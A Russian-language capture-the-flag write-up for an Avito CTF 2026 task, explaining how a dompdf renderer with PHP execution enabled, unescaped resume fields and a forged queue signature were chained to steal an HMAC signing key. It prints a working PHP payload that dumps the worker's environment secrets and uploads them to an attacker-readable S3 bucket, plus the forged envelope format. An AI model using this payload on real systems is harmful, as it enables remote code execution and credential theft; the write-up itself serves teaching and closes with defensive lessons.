# МёдХантер 3 — мастер-секрет подписи резюме (task21) — write-up

**Avito CTF 2026 · web / cloud (dompdf RCE → S3 exfil → recover HMAC signing key)**
**Цель:** достать главный секрет, которым подписываются PDF-резюме (код проверки), чтобы подделывать подпись любого документа.
**Сайт:** `https://hrportal-aoa51cvc.avitoctf.ru/`

## Флаг

```
avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}
```

Это **буквально значение `PDF_SIGNING_KEY`** — то есть сам мастер-секрет и есть флаг. Тот же самый секрет ранее «мелькнул» как найденный в S3 (`leak/…txt`) при работе над МёдХантер 2 — теперь понятно, что это и есть искомый ключ подписи из МёдХантер 3.

## Схема подписи (точная, из исходника воркера)

Каждый PDF получает `Код проверки`. По исходнику рендер-воркера (`render.php`/`index.php`, вытащены реверсом образа — см. ниже):

```php
// index.php:191
$verificationCode = hash_hmac('sha256', $key, (string) $pdfSigningKey);
```

В PHP сигнатура `hash_hmac($algo, $data, $key)` → **data = `$key` (UUID документа), ключ HMAC = `$pdfSigningKey`**. То есть:

```
verification_code = HMAC_SHA256( key = PDF_SIGNING_KEY, msg = document_id )
```

**Важнейшая деталь — в системе ДВА разных секрета, их легко перепутать:**

| Секрет | Что подписывает | Где взяли |
|--------|-----------------|-----------|
| `RENDER_QUEUE_SIGNING_KEY` = `mhq_v1_4f8c2d9a…` | конверт задания рендера (очередь): `sig = HMAC(mhq, key + "." + payload)` | найден в бинаре бэкенда (task19) |
| `PDF_SIGNING_KEY` = `avito{…}` | **код проверки готового PDF** — это и есть цель | **этот write-up** |

HMAC необратим, поэтому из пар (id, code) секрет не вычислить — его надо **утечь**. А вот наличие `mhq_v1_…` (первый секрет) даёт нам право **самим ставить в очередь любой рендер** — это и есть точка входа.

## Как я до этого дошёл (ход мысли)

### 1. Реверс рендер-воркера
PDF рендерится отдельным сервисом. Тот же SSRF→IMDSv1→IAM→`cr.yandex` из task18/19 позволяет вытащить образ `pdf-renderer` из приватного registry. Внутри — PHP-функция Yandex Cloud Function (`index.php` + `render.php`, dompdf в `vendor/`).

### 2. Находка №1 — dompdf с включённым PHP
```php
// render.php:64-66
$options->set('isPhpEnabled', true);   // ← арбитрарный PHP в HTML
$options->set('isRemoteEnabled', true);
```
**dompdf при `isPhpEnabled=true` исполняет `<script type="text/php"> … </script>` прямо в процессе рендера.** Это RCE — если мы контролируем HTML.

### 3. Находка №2 — поля резюме идут в HTML без экранирования
`build_html()` вставляет `title/about/experience/skills/contact` в heredoc **сырыми** (`{$about}` без `htmlspecialchars`). Значит любой из этих текстов = точка инъекции `<script type="text/php">`.

### 4. Находка №3 — воркер сам даёт нам S3-примитив записи
`index.php` в самом верху делает `require render.php`, а затем определяет глобальные функции `s3_request()`/`s3_presign_get()` (SigV4-клиент к Object Storage). Когда dompdf исполняет наш PHP **во время** `render_pdf()`, эти глобальные функции уже определены и **в области видимости**. Значит наш payload может вызвать `s3_request('PUT', getenv('STORAGE_ACCESS_KEY'), …)` — то есть **записать что угодно от имени воркера в бакет `medhunter-resumes-…`, который мы и так читаем** утёкшими в task18 ключами. Не нужно даже читать готовый PDF (результат лежит в `medhunter-results-…` с ACL, недоступным нам) — воркер сам кладёт добычу туда, куда мы дотянемся.

### 5. Как триггернуть рендер нашего HTML
Рендер запускается по событию Object Storage на префикс **`incoming/`** (строка `incoming/` нашлась в бинаре бэкенда; PUT в корень бакета триггер НЕ поднимает — проверено: объекты в корне не съедаются воркером). Задание — подписанный конверт:
```json
{"key":"<uuid>", "payload":"<base64(resume json)>",
 "signature":"HMAC_SHA256(mhq_v1_…, key + '.' + payload)"}
```
`mhq_v1_…` у нас есть → **подделываем валидный конверт с произвольным резюме**, а в поле `about` кладём PHP-payload. Кладём его как `incoming/<uuid>.json` → воркер срабатывает, рендерит, исполняет наш PHP.

### 6. Payload и добыча
```php
<script type="text/php">
  $d = "";
  foreach (getenv() as $k=>$v) { $d .= $k."=".$v."\n"; }
  if (function_exists("s3_request")) {
    s3_request("PUT", getenv("STORAGE_ACCESS_KEY"), getenv("STORAGE_SECRET_KEY"),
               "medhunter-resumes-6d6c314a", "loot/secrets.txt", $d, "text/plain");
  }
</script>
```
Читаем `loot/secrets.txt` нашими ключами → весь env воркера:
```
PDF_SIGNING_KEY=avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}   ← флаг = мастер-секрет
RENDER_QUEUE_SIGNING_KEY=mhq_v1_…(redacted — очередной ключ, локально)
RESULTS_ACCESS_KEY / RESULTS_SECRET_KEY  (доступ к бакету результатов, redacted)
CALLBACK_URL=http://10.10.0.28/api/internal/render-callback  (внутренний хост)
```

## Проверка (криптографически подтверждено)

Собрал 4 реальных пары (id, verification-code) со сгенерированных порталом PDF и проверил, что восстановленный ключ их воспроизводит:

```python
import hmac, hashlib
SECRET = "avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}"
vcode = lambda did: hmac.new(SECRET.encode(), did.encode(), hashlib.sha256).hexdigest()
# все 4 пары из pairs_sorted.txt совпали байт-в-байт → ключ верный
```
Все 4 пары совпали. Значит секрет настоящий, и мы можем выпустить валидный `Код проверки` для **любого** `document_id` → полная подделка подписи МёдХантера.

## Уязвимости (стек причин)

1. **dompdf `isPhpEnabled = true`** — классический RCE: рендер недоверенного HTML исполняет PHP. Никогда не включать `isPhpEnabled` для пользовательского контента (и обновляться — в dompdf хватало и RCE через `@font-face`/`php://`).
2. **Нет экранирования** полей резюме при сборке HTML → инъекция.
3. **Секреты в env процесса рендера** + доступный из того же процесса S3-клиент → мгновенная эксфильтрация в читаемый нами бакет.
4. **Один общий бакет** для входящих заданий и «служебных» путей; ключи от него утекли ещё в task18 (SSRF→IMDS→.env).
5. **Ключ подписи, выводимый через RCE** — даже стойкий HMAC-секрет бесполезен, если есть выполнение кода в компоненте, который его знает.

## Мораль

Стойкость HMAC (секрет не вычислить из пар id↔code) не спасает, если секрет можно **утечь**: нашли RCE в рендере (dompdf+PHP), а право запустить рендer нам дал уже известный `mhq_v1_…` (второй, «очередной» ключ). Итог — эксфильтрация env и получение `PDF_SIGNING_KEY`, значение которого и есть флаг. Урок по защите: разделять секреты по процессам, не включать исполнение кода в рендерерах, экранировать вывод и не хранить подписывающий ключ там, где есть путь к выполнению кода.

Файлы: `worker/index.php`, `worker/render.php` (реверс образа), `exploit2.py` (форж конверта + PHP-эксфил), `s3.py`/`s3put.py` (SigV4-клиент), `pairs_sorted.txt` (пары для проверки). Секреты (ключи S3, env-дамп) — только локально, в git не коммитятся.
